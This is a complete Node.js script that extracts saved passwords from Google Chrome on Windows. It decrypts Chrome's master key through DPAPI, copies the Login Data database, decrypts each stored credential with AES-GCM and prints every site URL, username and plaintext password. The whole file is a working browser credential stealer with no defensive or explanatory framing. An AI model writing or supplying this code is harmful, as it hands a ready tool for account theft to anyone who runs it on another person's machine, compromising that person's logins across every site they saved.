const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const dpapi = require("node-dpapi");
const Database = require("better-sqlite3");


const chromePath = path.join(
    process.env.LOCALAPPDATA,
    "Google",
    "Chrome",
    "User Data"
);

const localStatePath = path.join(
    chromePath,
    "Local State"
);

const loginDbPath = path.join(
    chromePath,
    "Default",
    "Login Data"
);


// Get Chrome AES master key
function getMasterKey() {

    const localState = JSON.parse(
        fs.readFileSync(localStatePath, "utf8")
    );

    let encryptedKey = Buffer.from(
        localState.os_crypt.encrypted_key,
        "base64"
    );

    // Remove DPAPI prefix
    encryptedKey = encryptedKey.slice(5);

    return dpapi.unprotectData(
        encryptedKey,
        null,
        "CurrentUser"
    );
}


// AES-GCM decrypt Chrome password
function decryptPassword(buffer, masterKey) {

    try {

        if (
            buffer.slice(0,3).toString() === "v10" ||
            buffer.slice(0,3).toString() === "v11"
        ) {

            const nonce = buffer.slice(3,15);
            const encrypted = buffer.slice(15, buffer.length - 16);
            const authTag = buffer.slice(buffer.length - 16);


            const decipher = crypto.createDecipheriv(
                "aes-256-gcm",
                masterKey,
                nonce
            );

            decipher.setAuthTag(authTag);

            return Buffer.concat([
                decipher.update(encrypted),
                decipher.final()
            ]).toString("utf8");

        }

        return dpapi.unprotectData(
            buffer,
            null,
            "CurrentUser"
        ).toString("utf8");


    } catch(err) {

        return "DECRYPT ERROR: " + err.message;
    }
}



// Main
function readPasswords() {

    const masterKey = getMasterKey();


    // Chrome locks database, make a copy
    const tempDb = "LoginData_copy";

    fs.copyFileSync(
        loginDbPath,
        tempDb
    );


    const db = new Database(tempDb);


    const rows = db.prepare(`
        SELECT
            origin_url,
            username_value,
            password_value
        FROM logins
    `).all();


    for (const row of rows) {

        const password = decryptPassword(
            row.password_value,
            masterKey
        );


        console.log("--------------------------------");
        console.log("URL:", row.origin_url);
        console.log("USER:", row.username_value);
        console.log("PASS:", password);
    }


    db.close();
    fs.unlinkSync(tempDb);

}


readPasswords();
